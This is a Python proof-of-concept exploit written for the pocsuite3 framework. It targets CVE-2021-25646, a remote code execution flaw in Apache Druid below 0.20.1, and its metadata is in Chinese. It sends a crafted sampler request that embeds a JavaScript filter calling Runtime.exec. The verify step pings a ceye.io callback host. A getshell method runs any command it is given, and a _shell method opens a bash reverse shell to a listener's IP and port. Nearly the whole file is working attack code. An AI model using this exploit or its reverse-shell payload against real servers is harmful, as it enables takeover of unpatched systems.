from collections import OrderedDict

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.lib.utils import random_str
import json

class POC(POCBase):
    vulID = 'attackbot-30'  # 自有编号
    vulnerability = 'CVE-2021-25646'  # 填写CVE或者CNVD编号没有null
    author = 'attackbot'  # 默认为attackbot不用修改
    vulDate = '2021-1-7'  # 漏洞公开的时间,不知道就写今天
    grade = 'high'  # 等级选项high,medium,low
    appPower = 'apache'  # 漏洞厂商名字
    appName = 'Druid'  # 漏洞应用名称
    appVersion = 'Apache Druid < 0.20.1'  # 漏洞影响版本
    name = 'attackbot_30_Apache_RCE_poc.py'  # 命名编号
    vulType = 'RCE'  # 漏洞类型,类型参考见 漏洞类型规范表
    vulclassification = 'Web'  # 漏洞归类 Web,Middleware,System,Internet equipment,safety equipment
    createDate = '2021-1-7'  # 编写 PoC 的日期
    updateDate = '2021-1-7'  # PoC 更新的时间,默认和编写时间一样
    desc = '''
    在Druid 0.20.0及更低版本中，用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。
    '''
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''  '''

    def _verify(self):
        result = {}
        vul = self.url
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json",
        }
        data = {
                "type":"index",
                "spec":{
                    "type":"index",
                    "ioConfig":{
                        "type":"index",
                        "firehose":{
                            "type":"local",
                            "baseDir":"/opt/",
                            "filter":""
                        }
                    },
                    "dataSchema":{
                        "dataSource":"sample",
                        "parser":{
                            "type":"string",
                            "parseSpec":{
                                "format":"json",
                                "timestampSpec":{
                                    "column":"time",
                                    "format":"iso"
                                },
                                "dimensionsSpec":{

                                }
                            }
                        },
                        "transformSpec":{
                            "transforms":[

                            ],
                            "filter":{
                                "type":"javascript",
                                "function":"function(value){return java.lang.Runtime.getRuntime().exec('ping xxxxx.ceye.io')}",
                                "dimension":"added",
                                "":{
                                    "enabled":"true"
                                }
                            }
                        }
                    }
                },
                "samplerConfig":{
                    "numRows":500,
                    "cacheKey":"c67e2881f1c64110b40c0f67608b0022"
                }
            }
        try:
            rep1 = requests.post(url=self.url.rstrip("/")+"/druid/indexer/v1/sampler?for=filter",headers=headers,data=json.dumps(data))
            if rep1.status_code == 200:
                url = 'http://api.ceye.io/v1/records'
                params = {
                    "token": "xxxx",
                    "type": "dns",
                    "filter": "xxx.ceye.io"
                }
                rep2 = requests.get(url=url, params=params,timeout=2)
                if "xxxx.ceye.io" in rep2.text:
                    result['VerfiryInfo'] = {}
                    result['VerfiryInfo']['URL'] = self.url
        except Exception as e:
            print(e)
        return self.parse_output(result)
    def getshell(self,cmd):
        result = {}
        vul = self.url.rstrip("/")+"/druid/indexer/v1/sampler?for=filter"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json",
        }
        data = {
        "type": "index",
        "spec": {
            "type": "index",
            "ioConfig": {
                "type": "index",
                "firehose": {
                    "type": "local",
                    "baseDir": "/opt/",
                    "filter": ""
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "parser": {
                    "type": "string",
                    "parseSpec": {
                        "format": "json",
                        "timestampSpec": {
                            "column": "time",
                            "format": "iso"
                        },
                        "dimensionsSpec": {}
                    }
                },
                "transformSpec": {
                    "transforms": [],
                    "filter": {
                        "type": "javascript",
                        "function": "function(value){return java.lang.Runtime.getRuntime().exec('"+cmd+"')}",
                        "dimension": "added",
                        "": {
                            "enabled": "true"
                        }
                    }
                }
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "cacheKey": "c67e2881f1c64110b40c0f67608b0022"
        }
    }
        rep = requests.post(url=vul, headers=headers, data=json.dumps(data))
    def _shell(self):
        cmd = "/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/{0}/{1} 0>&1".format(get_listener_ip(), get_listener_port())
        # print(cmd)
        result = dict()
        self.getshell(cmd)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(POC)